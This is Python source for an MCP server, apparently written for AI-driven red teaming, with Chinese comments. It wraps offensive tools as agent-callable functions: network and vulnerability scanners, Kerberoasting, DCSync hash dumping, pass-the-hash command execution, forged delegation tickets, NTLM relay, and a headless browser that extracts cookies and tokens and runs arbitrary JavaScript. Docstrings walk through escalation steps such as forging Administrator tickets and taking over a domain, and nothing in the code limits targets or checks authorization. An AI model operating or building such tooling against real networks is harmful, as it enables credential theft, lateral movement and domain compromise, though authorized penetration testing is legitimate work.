import asyncio
import shlex
import subprocess
import re
from mcp.server.fastmcp import FastMCP

# 初始化 RedTeam MCP 服务器
# 使用 mcp 官方提供的 FastMCP 快速构建工具库
mcp = FastMCP("RedTeam-Server")

def optimize_output(text: str, limit: int = 8000) -> str:
    """
    清洗并截断工具输出，剥离 ANSI 颜色乱码以极大节省 Token 消耗，
    并防止超长输出导致大模型上下文遗忘或崩溃。
    """
    if not text:
        return ""
    # 清除终端 ANSI 颜色代码（颜色乱码极其消耗大模型 Token）
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    text = ansi_escape.sub('', text)
    # 压缩连续空行
    text = re.sub(r'\n\s*\n', '\n', text)
    
    if len(text) > limit:
        return text[:limit] + f"\n\n...[⚠️ 输出过长已被系统截断。当前展示前 {limit} 字符以节省 Token 消耗。如需更多详情，请要求 AI 缩小探测范围（如使用更具体的网段、端口或字典）]..."
    return text

async def run_command_with_timeout(command: list[str], timeout: int = 120) -> str:
    """
    异步运行系统命令，带有超时保护和标准输出捕获。
    避免网络工具长时间挂起导致 AI / 客户端阻塞。
    """
    try:
        # 启动子进程，并将输出重定向到 PIPE
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 增加超时等待机制
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        
        output = stdout.decode('utf-8', errors='ignore')
        err_output = stderr.decode('utf-8', errors='ignore')
        
        combined_output = output if output else err_output
        optimized_result = optimize_output(combined_output)
        
        # 即使进程返回非 0 状态码 (常常发生于漏洞探测工具)，也必须返回它的输出，让 AI 能看到真实情况
        if process.returncode != 0:
            return f"命令执行结束 (退出码 {process.returncode})。\n返回内容:\n{optimized_result}"
        
        return optimized_result
        
    except asyncio.TimeoutError:
        # 超时时必须杀掉进程
        process.kill()
        return f"执行失败: 命令执行超时 (超过了 {timeout} 秒)。网络连接或扫描可能有问题。"
    except FileNotFoundError:
        return f"执行失败: 找不到可执行文件 '{command[0]}'，请验证它是否在系统的环境变量 PATH 中。"
    except PermissionError:
        return f"执行失败: 权限被拒绝，如果你使用的是快捷方式（.lnk），请检查快捷方式的指向或以管理员权限运行。"
    except Exception as e:
        return f"执行失败: 发生未知异常: {str(e)}"

@mcp.tool()
async def invoke_nxc(protocol: str, target: str, args: str = "") -> str:
    """
    使用 NetExec (nxc) 进行跨协议网络渗透测试和信息收集。
    支持 smb, ssh, winrm, wmi, mssql 等。
    
    :param protocol: 协议名称 (如 'smb', 'ssh', 'winrm')。必须填写。
    :param target: 目标 IP、网段或主机名。
    :param args: nxc 的附加参数字符串 (如 '-u username -p password --shares')。
    """
    command = ["nxc", protocol, target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_gogo(target: str, args: str = "") -> str:
    """
    使用 gogo 扫描器进行快速资产和指纹识别。
    
    :param target: 目标 IP 或网段，将作为 '-i' 参数传入。
    :param args: 附加参数 (如 '-p 80,443' 或 '-m 1')。
    """
    command = ["gogo", "-i", target]
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=240)


@mcp.tool()
async def invoke_fscan(target: str, args: str = "") -> str:
    """
    使用 fscan 进行快速内网资产扫描和漏洞发现。
    适用于内网大范围极速探活、弱口令爆破和常见漏洞(如 MS17-010, Weblogic)扫描。
    
    :param target: 目标 IP、网段或文件路径，对应 fscan 的 -h 参数 (例如 '192.168.1.1/24')。
    :param args: fscan 的附加参数 (例如 '-p 1-65535' 或 '-nobr' 跳过爆破)。
    """
    command = ["fscan", "-h", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_httpx(target: str, args: str = "") -> str:
    """
    使用 httpx (ProjectDiscovery) 进行 HTTP 存活检测和指纹识别。
    适用于快速探测目标 Web 服务的存活状态、Title、状态码和中间件。
    
    :param target: 目标 IP、域名或目标列表文件 (例如 'example.com' 或 '192.168.1.1')。
    :param args: 附加参数 (例如 '-title -status-code -tech-detect')。可以在 args 里通过 -u 直接提供目标。
    """
    command = ["httpx"]
    if target and not target.startswith("-"):
        command.extend(["-u", target])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_nuclei(target: str, templates: str = "", args: str = "") -> str:
    """
    使用 Nuclei 进行基于模板的定向漏洞扫描。
    适合在发现特定指纹后，使用特定的模板进行验证，避免盲目全量扫描。
    
    :param target: 目标 URL 或 IP。
    :param templates: 指定使用的模板名或路径 (例如 'cves/' 或 'technologies/wordpress/')。留空则执行默认范围。
    :param args: 附加参数 (例如 '-severity critical,high')。
    """
    command = ["nuclei", "-u", target]
    if templates:
        command.extend(["-t", templates])
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_ffuf(target: str, wordlist: str, args: str = "") -> str:
    """
    使用 ffuf 进行 Web 目录、隐藏文件、API 路由或内网虚拟主机名（VHost）的爆破与发现。
    适用场景：当 httpx 发现了某个内部 Web 服务，但首页是 403 或 404，你需要寻找后台入口、未授权 API 或遗留备份文件时。
    
    :param target: 目标 URL，必须包含 FUZZ 关键字 (例如 'http://192.168.1.1/FUZZ' 或 'http://FUZZ.corp.local')。
    :param wordlist: 字典文件所在的绝对路径 (例如 'd:/mcp/redteam-tools/dict.txt')。
    :param args: 附加参数，比如过滤长度、指定状态码 (例如 '-mc 200,301,302' 或 '-t 50')。
    """
    command = ["ffuf", "-u", target, "-w", wordlist]
    if args:
        command.extend(shlex.split(args))
    # 路径爆破耗时较长，给定足够超时时间
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_bloodhound_python(domain: str, dc_ip: str, auth_options: str, args: str = "-c All") -> str:
    """
    使用 bloodhound-python 收集 Active Directory (活动目录域) 的内部核心网络拓扑和权限路径。
    适用场景：当你在内网中获取了一个（即便权限极低的）域账号，你想分析域控路径、信任关系、是否有可利用的弱组策略或可委派权限。
    它不仅是收集工具，更是 AI 进行【域内提权攻击图谱分析】的无上利器！
    
    :param domain: 内部域的完整名称 (例如 'corp.local')。
    :param dc_ip: 域控制器的 IP 地址 (如 '192.168.1.10')。
    :param auth_options: 认证相关参数，由于涉及凭证，作为一个整体传入以支持明文密码或哈希传参 (如 '-u username -p password' 或者是 hashes)。
    :param args: 附加数据收集指令 (默认为 '-c All' 收集所有信息)。
    """
    command = ["bloodhound-python", "-d", domain, "-dc", dc_ip]
    if auth_options:
        command.extend(shlex.split(auth_options))
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_impacket_roasting(attack_type: str, domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
    """
    执行活动目录(AD)中的哈希提取攻击：AS-REP Roasting 或 Kerberoasting。
    适用场景：当你处于域外或拥有一个低权限域账号，想尝试获取其他(如服务账号、无预认证用户)的哈希以进行离线破解时。
    
    :param attack_type: "asreproast" (抓取无预认证用户的哈希) 或 "kerberoast" (抓取 SPN 服务账号的哈希)。
    :param domain: 域名 (如 'corp.local')。
    :param dc_ip: 域控 IP 地址。
    :param auth: 认证凭据格式 'user:pass'。如果是 asreproast 且没有密码，可以只填 'user' 或不填留空尝试匿名。
    :param args: 附加参数。Kerberoasting 通常需要 '-request'。例如 '-request -format hashcat'。
    """
    tool = "GetNPUsers.py" if attack_type.lower() == "asreproast" else "GetUserSPNs.py"
    command = [tool]
    if auth:
        command.append(f"{domain}/{auth}")
    else:
        command.append(domain + "/")
    command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_dcsync(auth_uri: str, dc_ip: str = "", args: str = "") -> str:
    """
    使用 secretsdump.py 模拟域控执行 DCSync 攻击，导出全域或特定用户的 NTLM Hash / Kerberos 密钥。
    适用场景：你已经获取了域管(Domain Admin)或具有 Replicating Directory Changes 权限的域账号，准备接管整个域或做权限维持(黄金票据/白银票据)时进行哈希抽取。
    
    :param auth_uri: 认证与目标信息，格式为 'domain/username:password@target_ip' 或传 hashes时填 'domain/user@target_ip'。
    :param dc_ip: 域控 IP 地址 (如果 auth_uri 中的 target_ip 不是域控，则需要此参数指定域控)。
    :param args: 附加参数。使用 PtH: '-hashes LMHASH:NTHASH'。如果不需要全部导出，只查单个用户: '-just-dc-user username'。
    """
    command = ["secretsdump.py", auth_uri]
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if not args or "-just-dc" not in args:
        command.append("-just-dc") # DCSync 默认必需参数
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_pth_exec(auth_uri: str, cmd: str, args: str = "") -> str:
    """
    使用 wmiexec.py / psexec.py / smbexec.py 执行 Pass-the-Hash (PtH 过哈希) 横向移动，获取交互式命令执行结果。
    适用场景：当你通过前置攻击收集到了某个机器的 Local Admin 或域管的 NTHash，你想直接在这台机器上执行系统命令时。
    
    :param auth_uri: 认证与目标，格式为 'domain/user:pass@ip' 或 'domain/user@ip' (结合 -hashes 使用)。
    :param cmd: 要执行的系统命令 (例如 'whoami'、'ipconfig' 或 'powershell -c ...')。
    :param args: 附加参数。必须包含 PtH 哈希例如 '-hashes :NTHASH'，注意前面有一个冒号；也可以指定执行工具例如使用 psexec: '-exec psexec.py' (默认 wmiexec)。
    """
    # 默认使用较为隐蔽的 wmiexec
    tool = "wmiexec.py"
    # 如果 args 中包含了想要替换工具的意图，我们可以稍微做下转换，不过简单起见直接调 wmiexec
    command = [tool]
    if args:
        command.extend(shlex.split(args))
    command.extend([auth_uri, cmd])
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_delegation_ticket(spn: str, auth_uri: str, impersonate: str = "", dc_ip: str = "", args: str = "") -> str:
    """
    使用 getST.py 申请伪造的服务票据，执行域委派攻击 (约束委派 / 基于资源的约束委派 S4U2Self/S4U2Proxy)。
    适用场景：当你发现了一个配置了约束委派的机器账户(或其哈希/密码)，或者是利用基于资源的约束委派(RBCD)提权时，可以利用此工具伪造 Administrator 的票据。生成的 .ccache 文件可用于后续攻击。
    
    :param spn: 目标服务主体名称 (例如 'cifs/target.corp.local')。
    :param auth_uri: 具有委派权限的机器账号或用户账号凭据 (格式 'domain/user:pass' 或 'domain/user')。
    :param impersonate: 要伪造/模拟的域用户 (通常是 'Administrator')，触发 S4U2Self 流程。
    :param dc_ip: 域控 IP。
    :param args: 附加参数 (如 '-hashes LM:NT' 或指定输出票据名 '-out ticket.ccache')。
    """
    command = ["getST.py", "-spn", spn]
    if impersonate:
        command.extend(["-impersonate", impersonate])
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_playwright_browse(url: str, action: str = "info", js_code: str = "", wait_time: int = 5, screenshot_path: str = "") -> str:
    """
    使用 Playwright 无头浏览器访问目标页面，读取 JavaScript 动态渲染后的完整信息。
    与 httpx 的区别：httpx 只能获取原始 HTTP 响应，Playwright 会真正执行 JS、渲染 DOM、保留 Cookie 和 LocalStorage。
    适用场景：SPA 单页应用信息提取、需要 JS 渲染的后台管理页面、提取 Cookie/Token、登录表单发现、动态加载的 API 端点发现。
    
    :param url: 目标 URL (如 'http://10.10.26.107:8080' 或 'https://target.com/admin')。
    :param action: 操作类型 - "info" (综合信息:标题/Cookie/表单/链接/Meta), "content" (页面纯文本), "html" (完整HTML), "screenshot" (截图保存), "js" (执行自定义JavaScript)。
    :param js_code: 当 action="js" 时要执行的 JavaScript 代码 (如 'document.cookie' 或 'JSON.stringify(localStorage)')。
    :param wait_time: 页面加载后额外等待秒数，用于等待 JS 异步渲染完成（默认 5 秒）。
    :param screenshot_path: action="screenshot" 时截图保存路径，留空则自动生成时间戳命名。
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return "执行失败: playwright 未安装。请运行 'pip install playwright && playwright install chromium'。"

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            page = await context.new_page()

            try:
                await page.goto(url, wait_until="domcontentloaded", timeout=30000)
            except Exception as nav_err:
                await browser.close()
                return f"页面导航失败: {str(nav_err)}"

            if wait_time > 0:
                await asyncio.sleep(wait_time)

            result = ""

            if action == "info":
                title = await page.title()
                current_url = page.url
                cookies = await context.cookies()

                forms = await page.evaluate("""() => {
                    return Array.from(document.forms).map(f => ({
                        action: f.action, method: f.method,
                        inputs: Array.from(f.elements).map(e => ({name: e.name, type: e.type})).filter(e => e.name)
                    }))
                }""")

                links = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('a[href]'))
                        .map(a => ({text: a.textContent.trim().substring(0, 60), href: a.href}))
                        .filter(l => l.href && !l.href.startsWith('javascript:'))
                        .slice(0, 50)
                }""")

                meta = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('meta'))
                        .map(m => ({name: m.name || m.httpEquiv || m.getAttribute('property'), content: m.content}))
                        .filter(m => m.name && m.content)
                }""")

                scripts_src = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('script[src]'))
                        .map(s => s.src).slice(0, 30)
                }""")

                output = [f"=== Playwright 页面综合信息: {url} ==="]
                output.append(f"页面标题: {title}")
                output.append(f"最终URL: {current_url}")

                output.append(f"\n--- Cookies ({len(cookies)}) ---")
                for c in cookies:
                    output.append(f"  {c['name']}={c['value'][:80]} (domain={c['domain']}, httpOnly={c.get('httpOnly', False)}, secure={c.get('secure', False)})")

                output.append(f"\n--- 表单 ({len(forms)}) ---")
                for f in forms:
                    output.append(f"  [Form] action={f['action']} method={f['method']}")
                    for inp in f.get('inputs', []):
                        output.append(f"    <input name='{inp['name']}' type='{inp['type']}'>")

                output.append(f"\n--- 链接 (前50) ---")
                for lnk in links:
                    output.append(f"  [{lnk['text'][:40]}] -> {lnk['href']}")

                output.append(f"\n--- Meta 标签 ({len(meta)}) ---")
                for m in meta:
                    output.append(f"  {m['name']}: {m['content'][:100]}")

                output.append(f"\n--- 外部脚本 ({len(scripts_src)}) ---")
                for src in scripts_src:
                    output.append(f"  {src}")

                result = "\n".join(output)

            elif action == "content":
                result = await page.inner_text("body")
                if len(result) > 50000:
                    result = result[:50000] + f"\n... [内容截断，总计 {len(result)} 字符]"

            elif action == "html":
                result = await page.content()
                if len(result) > 50000:
                    result = result[:50000] + f"\n... [HTML 截断，总计 {len(result)} 字符]"

            elif action == "screenshot":
                if not screenshot_path:
                    import time
                    screenshot_path = f"screenshot_{int(time.time())}.png"
                await page.screenshot(path=screenshot_path, full_page=True)
                result = f"截图已保存至: {screenshot_path}"

            elif action == "js":
                if not js_code:
                    result = "错误: action='js' 时必须提供 js_code 参数。\n常用示例:\n  document.cookie\n  JSON.stringify(localStorage)\n  document.querySelectorAll('input[type=hidden]').length"
                else:
                    js_result = await page.evaluate(js_code)
                    result = f"JavaScript 执行结果:\n{js_result}"

            else:
                result = f"未知 action '{action}'。支持: info / content / html / screenshot / js"

            await browser.close()
            return result

    except Exception as e:
        return f"Playwright 执行失败: {str(e)}"


@mcp.tool()
async def invoke_ntlmrelayx(target: str, listen_time: int = 60, args: str = "") -> str:
    """
    非阻塞式收集：启动 ntlmrelayx.py 进行 NTLM Relay 攻击。
    说明：由于这是被动式监听工具，传统的终端运行会永远阻塞。此 Tool 会让该进程后台执行限定的时长 (listen_time 秒)，
    随后强制停止并返回这段时间内所有的终端日志以便 AI 研判。
    在此监听期间，你可以调度其他 Tool (如 responder) 或执行 Web 请求来触发 NTLM 认证。
    
    :param target: 收到 NTLM 认证后要中继转发到达的【目标 IP 或 URL】(例如 'smb://192.168.1.20' 或 'ldap://192.168.1.10')。
    :param listen_time: 工具持续挂机监听的时间 (秒)，超时将中止并回传结果。
    :param args: 附加指令 (例如 '-smb2support' 或 '-c "whoami"' 中继后执行的系统命令，或 ' -i ' 开启交互)。
    """
    command = ["ntlmrelayx.py", "-t", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=listen_time)

if __name__ == "__main__":
    # 使用 stdio 模型运行 MCP (标准通信方式)
    mcp.run()
